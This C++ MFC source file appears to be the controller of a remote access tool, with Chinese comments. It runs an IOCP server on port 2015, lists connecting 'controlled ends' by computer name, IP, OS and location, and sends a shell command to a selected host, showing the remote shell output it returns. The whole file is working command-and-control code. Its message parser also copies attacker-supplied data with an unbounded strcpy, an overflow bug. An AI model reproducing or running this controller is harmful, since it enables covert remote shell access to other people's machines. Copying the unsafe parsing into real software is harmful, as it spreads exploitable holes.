// ClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CClientDlg dialog

CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CClientDlg::IDD, pParent)
	, m_num(0)
	, m_shellDlg(NULL)
{
	//{{AFX_DATA_INIT(CClientDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CClientDlg)
	DDX_Control(pDX, IDC_IOCPLIST, m_IocpList);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialog)
	//{{AFX_MSG_MAP(CClientDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()

	ON_NOTIFY(NM_RCLICK, IDC_IOCPLIST, OnRclickIocplist)
	ON_WM_TIMER()
	ON_COMMAND(ID_Shell, OnShell)
	//}}AFX_MSG_MAP

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientDlg message handlers

BOOL CClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// 插入列
	LONG lstyle = m_IocpList.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE); //获取listctrl的样式
	lstyle |= LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES;
	m_IocpList.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)lstyle); //进行listctrl样式的设置

	m_IocpList.InsertColumn(0,"id",LVCFMT_LEFT,50);
	m_IocpList.InsertColumn(1,"被控端版本",LVCFMT_LEFT,110);
	m_IocpList.InsertColumn(2,"计算机名称",LVCFMT_LEFT,110);
	m_IocpList.InsertColumn(3,"IP地址",LVCFMT_LEFT,110);		
	m_IocpList.InsertColumn(4,"操作系统",LVCFMT_LEFT,110);
	m_IocpList.InsertColumn(5,"地理位置",LVCFMT_LEFT,110);

	//----------------------------状态栏-------------------------------------------
	m_bar.Create(WS_CHILD|WS_VISIBLE|SBT_OWNERDRAW,CRect(0,0,0,0),this,1024); // 状态栏的创建
	int strPart[3] = {200,600,-1};
	m_bar.SetParts(3,strPart);
	//m_bar.SetText("上线主机:0台",2,0);
	//m_bar.SetText("数据库管理",1,0);
	
	AfxBeginThread((AFX_THREADPROC)CEIocpinitialization,this);                //Afxbeginthread创建新的线程执行
	// TODO: Add extra initialization here
	//SetTimer(0,500,NULL);                                                     //SetTimer 500毫秒调用一次Ontimer
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CClientDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}



int getValue(char *str, const char *key, char *value, int size)
{
	memset(value, 0, size);
	char *newstr=strstr(str,key);
	if (newstr==NULL)
		return -1;
	char *value_start=newstr+strlen(key)+1; //id=XXX&name=XXX
	char *value_end=strchr(value_start,'&');
	if (value_end==NULL) //最后一个key
		strcpy(value, value_start);
	else 
		memcpy(value, value_start, (int)(value_end-value_start));

	return 0;
	
}



/*****************************************************************************/
/*  自定义函数CEIocpinitialization                                           */
/*/ 负责初始化SOCKET，创建完成端口，关联SOCKET，显示上线信息                 */
/*/                                                                          */
/*****************************************************************************/
SOCKADDR_IN      saRemote;                                                        //连接用的
SOCKET           Accept;                                                          //连接用
int              RemoteLen;                                                       //初始化用
DWORD WINAPI CEIocpinitialization(void *m_dlg)
{
	CClientDlg *dlg = (CClientDlg *)m_dlg;
	


    HANDLE       CEm_IocpPort;                                                    //完成端口变量
	WSADATA      CEm_Wsd;                                                         // SOCKET库
	SYSTEM_INFO  systeminfo;                                                      //  
	SOCKADDR_IN  CEm_listenDdr;                                                   // SOCKET
    SOCKET       CEm_listenSck;                                                   //监听用的SOCKET
	int          CEm_Port=2015;                                                   //端口变量
	CString      initialization,initialization1,initialization2;                  //格式化输出的
	WORD ver =MAKEWORD(2,2);                                                      //初始化

	if(WSAStartup(ver,&CEm_Wsd) !=0 )                                             //初始化SOCKET库
	{	
		initialization="初始化SOCKET库错误!";
		dlg->m_bar.SetText(initialization,0,0);
		return 0;
	}

	CEm_IocpPort=CreateIoCompletionPort(INVALID_HANDLE_VALUE,NULL,0,0);            //创建完成端口

	GetSystemInfo(&systeminfo);                                                    //确定几个CPU

	for (int i=0; i < (int)systeminfo.dwNumberOfProcessors *2 + 2;i++)             //如果当前线程不是CPU*2+2，增加线程！
	{
		HANDLE GongZuoXianCheng;
	
		GongZuoXianCheng=CreateThread(NULL,0,CEIocpWorkThread,CEm_IocpPort,0,NULL);//创建工作者线程函数
	
		CloseHandle(GongZuoXianCheng); // 关闭
	}

     CEm_listenSck=WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED);    //创建监听套接字
	 
	 if (CEm_listenSck == INVALID_SOCKET)
	 {
	
		 return 0;
	 }
	 CEm_listenDdr.sin_family=AF_INET;
	 CEm_listenDdr.sin_port=htons(CEm_Port);
	 CEm_listenDdr.sin_addr.S_un.S_addr=htonl(INADDR_ANY);
	 
	 int CEm_bind,CEm_Listen;

	 CEm_bind=bind(CEm_listenSck,(SOCKADDR*)&CEm_listenDdr,sizeof(CEm_listenDdr)); //绑定监听套接字
	 if (CEm_bind == SOCKET_ERROR)
	 {
	
		 initialization1.Format(_T("%d:绑定失败!"),CEm_Port);
		 dlg->m_bar.SetText(initialization1,0,0);
		 return 0;
	
	 }

	 CEm_Listen=listen(CEm_listenSck,5);                                             //监听
	 if (CEm_Listen == SOCKET_ERROR)
	 {
		 initialization2.Format(_T("%d:端口监听失败!"),CEm_Port);
		 dlg->m_bar.SetText(initialization2,0,0);
		 return 0;
	 }
	 else
	 {	
		 initialization2.Format(_T("     正在监听 0.0.0.0:%d"),CEm_Port);
	     dlg->m_bar.SetText(initialization2,0,0);
	 }
	

	 while(TRUE)
	 {
            PER_HANDLE_DATA  *perhandledata =NULL;                                              //结构体=空
          

			RemoteLen=sizeof(saRemote);                                                         //用到了吧！
		
			Accept=accept(CEm_listenSck,(SOCKADDR*)&saRemote,&RemoteLen);                       //接收数据
		
			perhandledata=(LPPER_HANDLE_DATA)GlobalAlloc(GPTR,sizeof(PER_HANDLE_DATA));
         
			perhandledata->m_connectionSck=Accept;                                               //结构体中的SOCKET和ACCEPT关联
			memcpy(&(perhandledata->m_connectionDdr), &saRemote,RemoteLen);                      //拷贝数据
			
			CreateIoCompletionPort((HANDLE)Accept,CEm_IocpPort,(DWORD)perhandledata,0);          //套接字和完成端口关联
	
	
			DWORD  RecvBytes = 0;                                                          
			DWORD  Flags     = 0;

			LPPER_IO_DATA periodata = NULL;

			periodata =(LPPER_IO_DATA)GlobalAlloc(GPTR,sizeof(PER_IO_DATA));

			ZeroMemory(&(periodata->Overlapped),sizeof(OVERLAPPED));

			periodata->DataBuf.len =296;
			periodata->DataBuf.buf =periodata->buffer;
			periodata->OperationType =0;
			
			WSARecv(perhandledata->m_connectionSck,&(periodata->DataBuf),1,&(periodata->DataBuf.len),&Flags,&(periodata->Overlapped),NULL); //投递异步接收请求
			
		
	 }
	
	return 0;  

}


/*****************************************************************************/
/*  自定义函数CEIocpWorkThread                                               */
/*/ 负责工作者线程，IOCP读写操作                                             */
/*/                                                                          */
/*****************************************************************************/
DWORD WINAPI CEIocpWorkThread(LPVOID lpgram)
{  

	HANDLE WorkIocpPort =(HANDLE)lpgram;                                          //完成端口=参数lpgram
   	CClientDlg *dlg=(CClientDlg*)AfxGetApp()->m_pMainWnd;
	DWORD BytesTransferred;                                                          //双字节变量
    LPOVERLAPPED lpOverlapped;                                                       //结构体
    LPPER_HANDLE_DATA PerHandleData = NULL;                                          //结构先等于空
    LPPER_IO_DATA PerIoData = NULL;                                                  //空

    DWORD RecvBytes;                                                                                            
    DWORD Flags;
    BOOL bRet = FALSE;                                                               //布尔型变量=假
                                               //调试用
	while(TRUE)                                                                      //死循环
	{
		
		bRet = GetQueuedCompletionStatus(WorkIocpPort,&BytesTransferred,(LPDWORD)&PerHandleData,(LPOVERLAPPED*)&lpOverlapped,INFINITE);
		
	
		PerIoData =(LPPER_IO_DATA)CONTAINING_RECORD(lpOverlapped,PER_IO_DATA,Overlapped);
		if (0 == BytesTransferred)
        {
	
            closesocket(PerHandleData->m_connectionSck);
            GlobalFree(PerHandleData);
            GlobalFree(PerIoData);
			
            continue;
        }
		
        Flags = 0;
		//...
		//应该在这里添加代码，收到被控端发来的数据后根据协议头的格式进行判断被控端发送过来的是什么内容
	
		char value[128];
		getValue(PerIoData->DataBuf.buf, "cmd", value, 128);
		int cmd=atoi(value);

		if(PerHandleData->m_connectionSck!= SOCKET_ERROR )
		{			
			switch(cmd)
			{
				case COMMAND_SIGN:	
					AddHost(PerIoData->DataBuf.buf, PerHandleData->m_connectionSck);

					char PostData[1024];
					sprintf(PostData,"cmd=%03d&id=%03d",COMMAND_SIGN,dlg->m_num);
					send(PerHandleData->m_connectionSck, PostData, strlen(PostData)+1, 0);
					break;
				case COMMAND_SHELL:
					UpdateShellDlg(PerIoData->DataBuf.buf, PerHandleData->m_connectionSck);
					break;
			}

		}
        // 为下一个重叠调用建立单I/O操作数据
        ZeroMemory(&(PerIoData->Overlapped), sizeof(OVERLAPPED));
		PerIoData->DataBuf.len = 296;
        PerIoData->DataBuf.buf = PerIoData->buffer;
        PerIoData->OperationType = 0; // read
	
        WSARecv(PerHandleData->m_connectionSck,&(PerIoData->DataBuf),1,&RecvBytes,&Flags,&(PerIoData->Overlapped),NULL);
		
	
	}
	return 0;
}

/*****************************************************************************/
/*  自定义函数AddHost                                                        */
/*/ 负责上线信息，接收来自服务端的SOCKET和IP地址信息                         */
/*/                                                                          */
/*****************************************************************************/
void AddHost(char *data, int sock)
{
	char name[128],ip[128], system[128];
	getValue(data, "name", name, 128);
	getValue(data, "ip", ip, 128);
	getValue(data, "system", system, 128);

	CClientDlg *dlg=(CClientDlg*)AfxGetApp()->m_pMainWnd;
	int n=dlg->m_IocpList.GetItemCount();
	char buf[4];
	_itoa(n+1, buf, 10);
	dlg->m_IocpList.InsertItem(n,buf);
	dlg->m_IocpList.SetItemText(n,1,"1.00"); 
	dlg->m_IocpList.SetItemText(n,2,name);    
	dlg->m_IocpList.SetItemText(n,3,ip);	
	dlg->m_IocpList.SetItemText(n,4,system); 
	dlg->m_IocpList.SetItemData(n,sock);
	dlg->m_num=n+1;
                                                
}


void UpdateShellDlg(char *data, int sock){
	
	char output[MAX_BUFF];
	getValue(data, "output", output, MAX_BUFF);
	int len=strlen(output);
	int len2=strlen(data);
	CClientDlg *dlg = (CClientDlg*)AfxGetApp()->m_pMainWnd;
	CShellDlg *shellDlg=dlg->m_shellDlg;
	if (!dlg->m_shellDlg)
		return;
	CString csOutput(output);
	csOutput.Replace("\n", "\r\n");
	shellDlg->m_shelltxt+=csOutput;
	shellDlg->GetDlgItem(IDC_EDIT1)->SetWindowText(shellDlg->m_shelltxt);
	shellDlg->m_sock=sock;

}

/*****************************************************************************/
/*  自定义函数CheckOnlineProc                                                */
/*/ 负责动态显示连接数量，以及LIST动态添加删除操作                           */
/*/                                                                          */
/*****************************************************************************/
DWORD WINAPI CheckOnlineProc(void *m_dlg)
{
	CClientDlg *dlg = (CClientDlg *)m_dlg;                                          //窗口类指针
	int nCount = dlg->m_IocpList.GetItemCount();                                    //变量NCOUNT等于获得IOCPLIST的ITEM
	
	for(int i=0;i<nCount;i++)                                                       //如果I小于ITEM，I+1
	{
		SOCKET ss = dlg->m_IocpList.GetItemData(i);                                 //SOCKET数据等于IOCPLIST的数据
		int nRet = send(ss,"A",1,0);                                                //NRET等于发送SOUKET“A”1.0
		if(nRet == SOCKET_ERROR)                                                    //SOCKET等于错误                                          
		{
			if(WSAGetLastError() == WSAEWOULDBLOCK)                                 //
			{
				Sleep(10);                                                          //10毫秒
				continue;                                                           //强制执行下面的代码
			}
			dlg->m_IocpList.DeleteItem(i);                                          //删除ITEM和I的数据
			nCount--;                                                               //动态数据减1
			i--;                                                                    //减1
		}
		CString str;                                                                //如果不是错误执行
		str.Format("上线主机:%d台",nCount);                                         //格式化输出NCOUNT动态数据
        dlg->m_bar.SetText(str,2,0);		                                        //放到BAR状态栏第二个
	}
	return 0;
}


/*****************************************************************************/
/*  系统函数 OnRclickIocplist  RCLICK右键选择。                              */
/*/ 在IOCPLIST控件里选择弹出右键菜单                                         */
/*/                                                                          */
/*****************************************************************************/
void CClientDlg::OnRclickIocplist(NMHDR* pNMHDR, LRESULT* pResult) 
{
	CMenu CaiDan;                                                                     //菜单类
	CaiDan.LoadMenu(IDR_MENU1);                                                       //用菜单类加载菜单ID
	CMenu *ZhiZhen =CaiDan.GetSubMenu(0);                                             //菜单指针获得菜单项
	POINT ptmenus;                                                                    //坐标
	GetCursorPos(&ptmenus);                                                           //获得鼠标坐标
	ZhiZhen->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON,ptmenus.x,ptmenus.y,this);  //菜单从坐标地点弹出

	*pResult = 0;
}


/*****************************************************************************/
/*  系统函数 OnTimer  通过 SetTimer 调用。                                   */
/*/ 负责动态调用CheckOnlineProc函数，来检测是否有主机上下线                  */
/*/                                                                          */
/*****************************************************************************/
void CClientDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	//AfxBeginThread((AFX_THREADPROC)CheckOnlineProc,this);                           	//检测主机是否连接
	CDialog::OnTimer(nIDEvent);
}


void CClientDlg::OnShell()
{

	int i;
	int n=m_IocpList.GetItemCount();
	for (i=0;i<n;i++) {
		if (m_IocpList.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED)
			break;
	}
	if (i==n)
		return;

	int sock=m_IocpList.GetItemData(i);
	char PostData[1024];
	sprintf(PostData,"cmd=%03d",COMMAND_SHELL);
	send(sock, PostData, strlen(PostData)+1, 0);
	
	m_shellDlg= new CShellDlg;
	m_shellDlg->DoModal();


}


